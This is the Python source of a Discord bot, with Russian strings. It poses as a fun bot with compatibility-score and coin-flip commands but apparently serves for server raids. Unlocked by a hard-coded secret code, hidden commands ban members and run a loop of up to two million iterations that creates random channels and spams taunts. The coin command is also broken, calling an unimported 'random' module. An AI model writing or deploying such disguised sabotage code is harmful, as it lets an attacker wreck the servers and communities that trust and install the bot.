import discord
import random as rand
from discord.ext import commands
import config as cf
import text as txt
import time

client = commands.Bot(command_prefix='$')
client.remove_command("help")
print("Автор кода 0xSn1kky")
@client.event
async def on_ready():
  print(f"""
  Бот для рейда запущен!
  Токен: {cf.token}
  Префикс: $
  Бот: {cf.botname}""")
  
@client.command()
async def help(ctx):
  name = ctx.message.author
  await ctx.send(name.mention, txt.helpmsg)
  
@client.command()
async def zhelp(ctx, code):
  if code == "098123":
    await ctx.author.send("Привет чтобы банить участников команда $ban (отметить) (код: 098123) \n $raid - запустить рейд")
    await ctx.channel.purge(limit=1)
  else:
      pass

@client.command()
async def ban(ctx, member: discord.Member, *, code, reason = "ЭТО РЕЙД!!!"):
  if code == "098123":
    await ctx.channel.purge(limit=2)
    await member.ban(reason=reason)
  else:
    await ctx.send("У вас нет прав!")

@client.command()
async def raid(ctx):
  for i in range(2000000):
    guild = ctx.message.guild
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")
    await guild.create_text_channel(rand.randint(1,100000))
    await ctx.channel.send(txt.raid1)
    await ctx.channel.send(txt.raid2)
    await ctx.channel.send("-СЕРВЕР ХАХАХАХАХАХХАХАХАХАХАХАХА")

    
@client.command()
async def ship(ctx, u1, u2):
  await ctx.send(f"Совместимость {u1} и {u2} ♥️")
  await ctx.send("Узнаю...")
  time.sleep(2)
  s = rand.randint(1, 100)
  await ctx.send(f"Равна: {s}")
  
@client.command()
async def coin(ctx):
  await ctx.send("Подбрасываем монетку...")
  c = random.SystemRandom().choice(["Решка", "Орёл"])
  time.sleep(1.7)
  if c == "Решка":
    await ctx.send("Выпала: Решка")
  if c == "Орёл":
    await ctx.send("Выпал: Орёл")
    

client.run(cf.token)